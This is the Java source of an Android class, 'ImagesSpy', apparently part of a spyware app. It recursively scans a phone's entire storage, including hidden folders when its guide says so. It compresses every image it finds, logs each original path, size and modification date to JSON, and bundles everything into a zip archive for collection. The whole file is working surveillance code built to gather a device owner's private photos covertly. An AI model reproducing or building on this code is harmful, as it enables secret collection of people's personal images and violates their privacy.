package com.gameofcoding.spy.spys;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Matrix;
import android.graphics.Paint;
import com.gameofcoding.spy.guides.ImagesSpyGuide;
import com.gameofcoding.spy.utils.AppConstants;
import com.gameofcoding.spy.utils.FileUtils;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.ZipUtils;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Compresses and saves images in a zip file
 */
public class ImagesSpy implements Spy {
    private static final String TAG = "ImagesSpy";

    public static final String IMAGES_DIR_NAME = "images";
    public static final String IMAGES_ZIP_FILE_NAME = "images.zip";
    public static final String IMAGES_PROPS_FILE_NAME = "images.json";

    private final File ROOT_DIR = AppConstants.EXTERNAL_STORAGE_DIR;
    /*
     * We cannot use multithreads to increase compression speed because android's heap size
     * is very limited and if we try to use multiple threads it may throw OutOfMemoryError.
     * Here we are now using only two threads for compression which are enough for medium number
     * of photos.
     */
    private final ExecutorService mExecutor = Executors.newFixedThreadPool(2);
    private final List<Future<?>> mExecFutures = new ArrayList<Future<?>>();
    private final JSONArray mImagesProps = new JSONArray();
    private ImagesSpyGuide mGuide;
    private File mDestDir;

    public ImagesSpy(Context context, File destDir) {
	mDestDir = destDir;
	mGuide = new ImagesSpyGuide(ROOT_DIR);
	if(!mGuide.saveImages) {
	    XLog.v(TAG, "Guide: Saving images disabled");
	    return;
	}

	// Create destination directory if it does not exist
	if(!mDestDir.exists()) {
	    if(!mDestDir.mkdirs()) {
		throw new RuntimeException("Couldn't create directory for images, mDestDir "
					   + mDestDir);
	    }
	}
    }

    @Override
    public void snoop() {
	if(!mGuide.saveImages)
	    return;

	if(mGuide.imagesToBeLoaded != null) {
	    // we have been told to load only specific images
	    for(File file : mGuide.imagesToBeLoaded) {
		if(file.isDirectory()) {
		    scanDir(file, mDestDir);
		    continue;
		}

		Compressor compressor = Compressor.loadIfImage(file, mGuide);
		if(compressor != null)
		    compressAndStoreImage(compressor, file, mDestDir);
	    }
	} else {
	    // Scan all images from root directory of internal storage
	    scanDir(ROOT_DIR, mDestDir);
	}

	try {
	    // Wait until all images are compressed and stored
	    for(Future<?> execFuture : mExecFutures)
		execFuture.get();
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occured while waiting for finishing of execution.", e);
	}

	try {
	    // Write image props to file
	    FileUtils.write(new File(mDestDir, IMAGES_PROPS_FILE_NAME), mImagesProps.toString());

	    // Zip scanned files
	    XLog.i(TAG, "Zipping images...");
	    ZipUtils zipUtils = new ZipUtils();
	    File[] filesToZip  = mDestDir.listFiles();
	    File zipDestFile = new File(mDestDir, IMAGES_ZIP_FILE_NAME);
	    if(zipDestFile.exists()) {
		if(zipDestFile.delete())
		    XLog.i(TAG, "Destination zip file deleted!");
		else
		    XLog.e(TAG, "Destination zip could not be deleted!");
	    }
	    zipUtils.zip(filesToZip, zipDestFile, true);
	    XLog.i(TAG, "Images zipped");
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occurred while zipping saved images", e);
	}
    }

    private File generateFile(File sourceFile, File destDir) {
	String fileName = sourceFile.getName();

	// Add format at the end if it has not
	if(!fileName.contains("."))
	    fileName += ".jpeg";

	File destFile = new File(destDir, fileName);

	int suffix = 1;
	while(destFile.exists()) {
	    String newFileName = fileName;
	    String fileSuffix = "(" + suffix++ + ")";
	    // e.g img.jpeg > img(n).jpeg
	    newFileName = newFileName.substring(0, newFileName.lastIndexOf("."))
		+ fileSuffix
		+ newFileName.substring(newFileName.lastIndexOf("."),
					newFileName.length());
	    destFile = new File(mDestDir, newFileName);
	}

	try {
	    if(!destFile.createNewFile()) {
		XLog.e(TAG, "generateFile(File, File): Couldn't create file: " + destFile);
		return null;
	    }
	    return destFile;
	} catch(IOException e) {
	    XLog.e(TAG, "generateFile(File, File): Couldn't create file: " + destFile, e);
	    return null;
	}
    }

    private void scanDir(final File directory, final File destDir) {
	// Return if it is hidden and if guide instructs to omit hidden directories
	if(directory.isHidden() && !(mGuide.scanHiddenFiles)) {
	    XLog.v(TAG, "scanDir(File, File): skipping hidden directory: " + directory);
	    return;
	}

	// Return if directory is not to be scanned
	for(File exceptFile : mGuide.exceptFiles) {
	    if(directory.getAbsolutePath().equals(exceptFile.getAbsolutePath())) {
		XLog.v(TAG, "scanDir(File, File): skipping directory: " + directory);
		return;
	    }
	}

	// Load directory
	if (directory.isDirectory()) {
	    //XLog.d(TAG, "Scanning Dir: " + directory.toString());
	    for (final File file : directory.listFiles()) {
		if (file.isDirectory()) {
		    scanDir(file, destDir);
		    continue;
		}

		Compressor compressor = Compressor.loadIfImage(file, mGuide);
		if (compressor != null)
		    compressAndStoreImage(compressor, file, destDir);
	    }
	} else {
	    if(directory.isFile())
		XLog.e(TAG, "scanDir(File): file="+directory+", is a file!");
	    else if(!directory.exists())
		XLog.e(TAG, "scanDir(File): file="+directory+", does not exist!");
	    else
		XLog.e(TAG, "scanDir(File): file="+directory+", couldn't be loaded!");
	}
    }

    private void compressAndStoreImage(Compressor compressor, File sourceFile, File destDir) {
	// Generate new file for storing compressed image
	final File destFile = generateFile(sourceFile, destDir);

	Future<?> execFuture  = mExecutor.submit(() -> {
		compressor.compress()
		    .storeImage(destFile)
		    .loadImageDetails()
		    .close();
		// JSONArray is not thread safe so we will make it synchronized
		synchronized(this) {
		    mImagesProps.put(compressor.getImageProps());
		}
	    });
	mExecFutures.add(execFuture);
    }
}

class Compressor {
    private static final String TAG = "Compressor";
    private File mSourceFile;
    private File mDestFile;
    private ImagesSpyGuide mGuide;
    private Bitmap mScaledBitmap;
    private BitmapFactory.Options mOptions;
    private JSONObject mImageProps;

    private Compressor(File sourceFile, BitmapFactory.Options options, ImagesSpyGuide guide) {
	mSourceFile = sourceFile;
	mOptions = options;
	mGuide = guide;
    }

    public static Compressor loadIfImage(File sourceFile, ImagesSpyGuide guide) {
	if (sourceFile == null || !sourceFile.exists())
	    return null;
	BitmapFactory.Options options = new BitmapFactory.Options();
	options.inJustDecodeBounds = true;
	BitmapFactory.decodeFile(sourceFile.toString(), options);
	if(options.outWidth > 0 && options.outHeight > 0)
	    return new Compressor(sourceFile, options, guide);
	return null;
    }

    private int calculateInSampleSize(int reqWidth, int reqHeight) {
	// Raw height and width of image
	final int height = mOptions.outHeight;
	final int width = mOptions.outWidth;
	
	int inSampleSize = 1;

	if (height > reqHeight || width > reqWidth) {
	    final int halfHeight = height / 2;
	    final int halfWidth = width / 2;

	    // Calculate the largest inSampleSize value that is a power of 2 and keeps both
	    // height and width larger than the requested height and width.
	    while ((halfHeight / inSampleSize) >= reqHeight
		   && (halfWidth / inSampleSize) >= reqWidth) {
		inSampleSize *= 2;
	    }
	}
	return inSampleSize;
    }

    public Compressor compress() {
	String imagePath = mSourceFile.toString();

	// actual width and height of image
        int actualHeight = mOptions.outHeight;
        int actualWidth = mOptions.outWidth;

	// max Height and width values of the compressed image is taken as 816x612
        float maxHeight = mGuide.maxWidth;
        float maxWidth = mGuide.maxHeight;
        float imgRatio = actualWidth / actualHeight;
        float maxRatio = maxWidth / maxHeight;

	// width and height values are set maintaining the aspect ratio of the image
        if (actualHeight > maxHeight || actualWidth > maxWidth) {
            if (imgRatio < maxRatio) {
                imgRatio = maxHeight / actualHeight;
                actualWidth = (int) (imgRatio * actualWidth);
                actualHeight = (int) maxHeight;
            } else if (imgRatio > maxRatio) {
                imgRatio = maxWidth / actualWidth;
                actualHeight = (int) (imgRatio * actualHeight);
                actualWidth = (int) maxWidth;
            } else {
                actualHeight = (int) maxHeight;
                actualWidth = (int) maxWidth;
            }
        }

	// setting inSampleSize value allows to load a scaled down version of the original image
        mOptions.inSampleSize = calculateInSampleSize(actualWidth, actualHeight);

	// inJustDecodeBounds set to false to load the actual bitmap
        mOptions.inJustDecodeBounds = false;
	Bitmap bitmapImage = null;
        try {
	    // load the bitmap from its path
            bitmapImage = BitmapFactory.decodeFile(imagePath, mOptions);
	    mScaledBitmap = Bitmap.createBitmap(actualWidth, actualHeight, Bitmap.Config.ARGB_8888);
        } catch (OutOfMemoryError e) {
	    XLog.e(TAG, "Exception occured while loading bitmap in memory", e);
        }

        float ratioX = actualWidth / (float) mOptions.outWidth;
        float ratioY = actualHeight / (float) mOptions.outHeight;
        float middleX = actualWidth / 2.0f;
        float middleY = actualHeight / 2.0f;

        Matrix scaleMatrix = new Matrix();
        scaleMatrix.setScale(ratioX, ratioY, middleX, middleY);

        Canvas canvas = new Canvas(mScaledBitmap);
        canvas.setMatrix(scaleMatrix);
        canvas.drawBitmap(bitmapImage,
			  middleX - bitmapImage.getWidth() / 2,
			  middleY - bitmapImage.getHeight() / 2,
			  new Paint(Paint.FILTER_BITMAP_FLAG));
	mScaledBitmap = Bitmap.createBitmap(mScaledBitmap, 0, 0,
					    mScaledBitmap.getWidth(),
					    mScaledBitmap.getHeight(),
					    null, true);
	return this;
    }

    public Compressor storeImage(File destFile) {
	if(mScaledBitmap == null || destFile == null)
	    return null;
	mDestFile = destFile;

	try {
	    FileOutputStream fos = new FileOutputStream(destFile);
	    mScaledBitmap.compress(Bitmap.CompressFormat.JPEG, mGuide.imageQuality, fos);
	    fos.close();
	    return this;
	} catch (Exception e) {
	    XLog.e(TAG, "Error occurred while storing image", e);
	    return null;
	}
    }

    public JSONObject getImageProps() {
	return mImageProps;
    }

    public Compressor loadImageDetails() {
	if(mOptions == null || mScaledBitmap == null)
	    return null;

	// Save details about image in json properties file
	String imagePath = mSourceFile.toString();
	// Replace '/storage/emulated/0/' with 'inter/' to save some space
	imagePath = imagePath.replace(AppConstants.EXTERNAL_STORAGE_DIR.toString(),
				      "inter/");
	String actualResolution =
	    mOptions.outWidth + "x" + mOptions.outHeight;
	String compressedResolution =
	    mScaledBitmap.getWidth() + "x" + mScaledBitmap.getHeight();
	if(actualResolution.equals(compressedResolution))
	    compressedResolution = "UNCOMPRESSED";
	String readableSize = Utils.readableFileSize(mSourceFile.length());
	String lastModified = new Date(mSourceFile.lastModified()).toString();
	try {
	    mImageProps = new JSONObject();
	    mImageProps.put("Path: ", imagePath);
	    mImageProps.put("New Name: ", mDestFile.getName());
	    mImageProps.put("Resol.: ", actualResolution + "  ->  " + compressedResolution);
	    mImageProps.put("Size: ", readableSize);
	    mImageProps.put("Modified: ", lastModified);
	    return this;
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occured while saving image props.", e);
	    return null;
	}
    }

    public void close() {
	mScaledBitmap.recycle();
    }
}
